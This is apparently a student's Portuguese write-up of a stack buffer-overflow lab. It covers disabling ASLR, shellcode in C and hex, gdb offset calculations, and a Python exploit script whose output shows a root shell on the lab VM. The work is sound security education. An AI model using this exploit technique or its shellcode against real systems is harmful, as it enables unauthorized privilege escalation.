# Buffer overflow
## 2 Set-up
- Desativar as seguranças mais concretamente o gerenciamento random do SO para ser mais fácil sabermos o starting point do endereçamento da memória
```shell
sudo sysctl -w kernel.randomize_va_space=0
```
- Trabalhar no bin/sh
```shell
sudo ln -sf /bin/zsh /bin/sh
```
## 3 Shell code
- Basic C shell code
```c
#include <stdio.h>
int main() {
	char*name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
}
```
### 3.4 call_sheelcode.c
Código:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
#if __x86_64__
	"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
	"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
	"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	"\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif;

int main(int argc, char**argv){
	char code[500];
	strcpy(code, shellcode); // Copy the shellcode to the stack
	int (*func)() = (int(*)())code;
	func();                 // Invoke the shellcode from the stack
	return 1;
}
```
Output: Abriu uma shell nas duas opções.

**Nossas observações:**
Ora bem, após corrermos ambos os programas reparamos que abriu uma shell cada um `$   ` cada um com acesso a `/bin/sh`

## Task 3

Depois de compilarmos tudo da Task 2, fizmos `gdb stack-L*-dbg`

Com isto criamos um breakpoint no bof, corremos o programa até lá e vimos os endereços nas variáveis *ebp* e *buffer*

**Resultados da shell**
- Para stack-L1-dbg
```shell
gdb-peda$ p $ebp
$1 = (void *) 0xffffcaf8
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffca8c
gdb-peda$ p/d 0xffffcaf8 - 0xffffca8c
$3 = 108
gdb-peda$ 
```


**exploit.py**

```python
#!/usr/bin/python3   
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 400               # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0xffffca8c+300         # Change this number
offset = 112                # Change this number

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Output

```shell
seed@VM:~/.../code$ ./stack-L1
Input size: 517
# whoami                                                                                                                                                  root
# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
#           
```

**Nossas Observações** Concluimos com êxito o buffer-overflow utilizando `stack-L1`, podemos reparar que temos os privilégios do super usuário, mais concretamente *root*. 

Explicação dos dados:
- *ret*, usamos o valor 0xffffca8c que é o address do &buffer, somamos 300 por tentativa e erro;
- *offset*, usamos a diferença calculada com $ebp - &buffer e somamos os 4 bits(por ser 32 bits) dando assim 112;
- *start*, escolhemos 400, pois tinhamos de escolher um numero de 100 a 400, e como o badfile tinha tamanho 512 então utilizamos 400;
- a *shellcode* extraímos de github do seedlabs para 32bits;


Para os outros stack-L's utilizamos a mesma lógica, atualizando apenas todos estes valores (excepto a shell code) mas respeitando sempre as mesma regras.
